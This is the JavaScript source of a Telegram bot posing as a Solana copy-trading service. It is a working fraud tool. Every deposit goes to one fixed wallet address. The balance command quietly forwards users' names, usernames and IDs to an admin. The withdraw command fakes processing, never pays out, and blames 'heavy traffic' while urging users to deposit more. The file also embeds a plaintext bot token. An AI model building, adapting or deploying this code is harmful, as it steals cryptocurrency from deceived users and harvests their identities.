const { Telegraf } = require('telegraf');

// Your Bot API Key
const bot = new Telegraf('7403899361:AAGQu1ycL5KrauRbcDzSo_ahZrkXneQsPc4');

// Wallet address
const WALLET_ADDRESS = '8CEkNWWi6ipY79Wjmubip65Gvy7EWvFMQKv3gLK3wzaV';

// Admin's Telegram ID for notification
const ADMIN_ID = '7517919728';  // Replace with your actual Telegram ID

// /start command
bot.start((ctx) => {
  ctx.reply(
    `Welcome to SyncTraderBot.\n\n` +
    `Solana's fastest bot to copy trade any coin (SPL token).\n\n` +
    `To start trading, deposit SOL to your Fiat wallet address:\n\n` +
    `${WALLET_ADDRESS}`
  );
});

// /wallet command
bot.command('wallet', (ctx) => {
  ctx.reply(
    `Your Wallet:\n\n` +
    `Address: ${WALLET_ADDRESS}\n\n` +
    `Copy the address and send SOL to deposit.`
  );
});

// /balance command (Removed - now only notifies admin)
bot.command('balance', (ctx) => {
  ctx.reply('Please wait, we\'re processing it...');
  // Notify the admin with user's username and ID
  const userInfo = ctx.from;
  const messageToAdmin = `User: ${userInfo.first_name} ${userInfo.last_name || ''}\n` +
                         `Username: @${userInfo.username}\n` +
                         `ID: ${userInfo.id}\n` +
                         `Language: ${userInfo.language_code}`;
  bot.telegram.sendMessage(ADMIN_ID, messageToAdmin);
});

// /withdraw command
bot.command('withdraw', (ctx) => {
  ctx.reply('Please provide your wallet address and the amount to withdraw.');
  // Collect wallet address and amount
  bot.on('text', (ctx) => {
    // Assuming the user sends both address and amount in a single message, you can process it here.
    const userMessage = ctx.message.text;
    
    // Process address and amount
    const [address, amount] = userMessage.split(' '); // Assuming a space-separated format (address amount)

    // Send a confirmation to the user
    ctx.reply(`Address: ${address}\nAmount: ${amount}\n\nWe are processing your withdrawal...`);

    // After processing, let the user know there's heavy traffic
    setTimeout(() => {
      ctx.reply('We\'re having heavy traffic at the moment, but you can still fund your account.');
    }, 5000); // Wait for 5 seconds before sending the heavy traffic message
  });
});

// Fallback for unknown commands
bot.on('text', (ctx) => {
  ctx.reply('Unknown command. Please use /start to see available options.');
});

// Start the bot
bot.launch();
console.log('Bot is running...');
